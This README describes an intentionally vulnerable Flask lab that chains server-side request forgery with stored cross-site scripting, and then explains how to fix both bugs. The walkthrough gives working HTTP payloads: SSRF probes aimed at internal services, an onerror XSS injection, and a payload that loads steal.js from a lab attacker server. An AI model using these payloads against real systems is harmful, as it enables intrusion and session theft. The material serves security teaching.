# SSRF → Stored XSS Lab

> ⚠️ **Intentionally vulnerable.** Educational use only. Do **not** expose this
> to the public internet, do **not** copy this code into a real application,
> and do **not** run it on a host that has access to production networks,
> cloud metadata services, or internal resources you don't want probed.

A minimal Flask + SQLite app that chains two classic bugs:

1. **CWE-918 Server-Side Request Forgery** — the server fetches an arbitrary
   user-supplied profile-picture URL with no validation ("for thumbnail
   generation").
2. **CWE-79 Stored Cross-Site Scripting** — that same URL is later rendered
   into an `<img src="...">` attribute without escaping, so an attacker can
   break out of the attribute and fire JavaScript.

## Layout

```
ssrf-xss/
├── docker-compose.yml
├── app/                  # vulnerable Flask app   (host :5080)
├── attacker-server/      # static XSS payloads    (host :5081)
└── internal-service/     # SSRF pivot target      (lab-internal only)
```

| Container           | Host port | Purpose                                |
|---------------------|-----------|----------------------------------------|
| `app`               | 5080      | Main vulnerable app                    |
| `attacker-server`   | 5081      | Hosts `xss.html`, `steal.js`           |
| `internal-service`  | —         | Only reachable inside the Docker net   |

## Run

```bash
docker compose up --build
```

Then open <http://localhost:5080/>.

Seeded users (password `password123`):

- `alice`
- `bob`

## Why the server fetches the URL

The `/api/profile` handler calls `_fetch_url_server_side(url)` before
storing the value, ostensibly to:

- verify the remote image exists (status code check),
- record `Content-Type` / size for later thumbnail generation,
- reject broken links at submit time.

This is a *real* pattern in production apps (avatar import, OpenGraph
preview, link unfurling, webhook validation). It is also exactly how SSRF
gets introduced: the server performs a network request to a destination the
attacker chose. Without a scheme allowlist + DNS pinning + egress filtering,
that destination can be `http://169.254.169.254/`, `http://localhost:6379/`,
a Burp Collaborator host, or — in this lab — `http://internal-service:5000/admin`.

## Attack walkthrough

### 0. Warm up

```bash
curl http://localhost:5080/            # user list
```

Log in as `alice` / `password123` in a browser and keep the session cookie
handy (DevTools → Application → Cookies, or proxy through Burp).

### 1. Confirm SSRF with Burp Collaborator

1. In Burp, **Collaborator client → Copy to clipboard** (e.g.
   `abc123.oast.site`).
2. Intercept a request to `PATCH /api/profile` (or replay one from history):

   ```http
   PATCH /api/profile HTTP/1.1
   Host: localhost:5080
   Content-Type: application/json
   Cookie: session=<alice session>

   {"profilePicture": "http://abc123.oast.site/probe"}
   ```

3. Send it. The response will look like:

   ```json
   {"ok": true, "updated": ["profile_picture"],
    "fetch": {"ok": true, "status": 200, "content_type": "text/html", ...}}
   ```

4. **Collaborator → Poll now** — you should see DNS + HTTP interactions
   originating from the Docker host. That is your server-side fetch hitting
   the attacker-controlled hostname. SSRF confirmed.

### 2. Pivot to the internal service

`internal-service` is not published on the host — from the outside, you
cannot reach it. From inside the app container you can:

```http
PATCH /api/profile HTTP/1.1
Host: localhost:5080
Content-Type: application/json
Cookie: session=<alice session>

{"profilePicture": "http://internal-service:5000/admin"}
```

The `fetch` field in the response reveals that the internal endpoint
returned `200 application/json` — the vulnerable server just exfiltrated
something it should never have been able to reach. A realistic exploit
would read the body; this lab stops at proving the pivot.

### 3. Stored XSS via the same field

`profile_picture` is rendered into the profile page like this
(see `app/templates/profile.html`):

```html
<img class="avatar" src="{{ user['profile_picture']|safe }}" alt="avatar">
```

`|safe` disables Jinja's autoescaping. Submit:

```http
PATCH /api/profile HTTP/1.1
Host: localhost:5080
Content-Type: application/json
Cookie: session=<alice session>

{"profilePicture": "x\" onerror=\"alert('XSS by alice')"}
```

Then visit <http://localhost:5080/profile/1> (alice's profile). The img tag
becomes:

```html
<img class="avatar" src="x" onerror="alert('XSS by alice')" alt="avatar">
```

— the `src` is bogus, so the browser fires `onerror` and runs the
attacker-controlled JS. Any user who views Alice's profile is popped.

For a nastier payload that uses `attacker-server`:

```json
{"profilePicture": "x\" onerror=\"var s=document.createElement('script');s.src='http://localhost:5081/steal.js';document.body.appendChild(s)"}
```

(Note: in the victim's browser, `attacker-server` is reachable at
`http://localhost:5081/`. From inside the `app` container it's
`http://attacker-server/`.)

### 4. Chain summary

```
attacker → PATCH /api/profile {profilePicture: <url>}
             │
             ├── server-side fetch  ──► Collaborator / internal-service   (SSRF, CWE-918)
             │
             └── stored verbatim    ──► <img src="..."> rendered unsafely (Stored XSS, CWE-79)

victim   → GET /profile/<id>
             └── HTML contains attacker payload → JS executes in victim's session
```

## How to fix

### Fixing the SSRF (`_fetch_url_server_side`)

Defence in depth — apply all of these, not just one:

1. **Scheme allowlist.** Only `http://` and `https://`. Reject `file://`,
   `gopher://`, `dict://`, `ftp://`, etc.
2. **Host allowlist**, not blocklist. An allowlist of trusted image CDNs is
   far safer than trying to blocklist every private range.
3. **If you must accept arbitrary hosts**, resolve DNS yourself, reject any
   answer in a private / link-local / loopback / reserved range
   (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `::1`, `fc00::/7`, …),
   then connect to the resolved IP directly — this defeats DNS rebinding.
   Use `ipaddress.ip_address(...).is_private` etc. in Python.
4. **Disable redirects** or re-validate the target of every redirect with
   the same rules.
5. **Set short timeouts** and a small max response size.
6. **Network-level egress filtering** — put the app in a subnet that cannot
   reach internal services or cloud metadata endpoints. Belt + braces.
7. Consider a vetted library: [`ssrf-req-filter`](https://www.npmjs.com/package/ssrf-req-filter)
   (Node), [`advocate`](https://pypi.org/project/advocate/) (Python), or a
   dedicated egress proxy like `smokescreen`.

Sketch:

```python
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"http", "https"}

def safe_fetch(url: str):
    u = urlparse(url)
    if u.scheme not in ALLOWED_SCHEMES or not u.hostname:
        raise ValueError("bad scheme/host")
    infos = socket.getaddrinfo(u.hostname, u.port or (443 if u.scheme == "https" else 80))
    ip = ipaddress.ip_address(infos[0][4][0])
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast:
        raise ValueError("blocked address")
    # then connect to `ip` directly, not the hostname, to defeat rebinding
    ...
```

### Fixing the XSS (profile template)

- Remove `|safe`. Let Jinja's autoescape handle the attribute.
- Better still, **don't store arbitrary URLs at all** — store an opaque ID
  referencing an image you fetched and re-hosted yourself, and render
  `/media/<id>`. This also kills a whole class of open-redirect / phishing
  pivots.
- If you must store the URL, validate it (`http`/`https` only, no JS URIs,
  no data URIs), and render it via `url_for` or equivalent.
- Add a strict Content-Security-Policy: `default-src 'self'; img-src 'self' https:; script-src 'self'`
  — this won't fix the bug, but it raises the cost of exploitation.

## References

- CWE-918: <https://cwe.mitre.org/data/definitions/918.html>
- CWE-79: <https://cwe.mitre.org/data/definitions/79.html>
- OWASP SSRF Prevention Cheat Sheet
- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy — SSRF & XSS labs

## Teardown

```bash
docker compose down -v
```
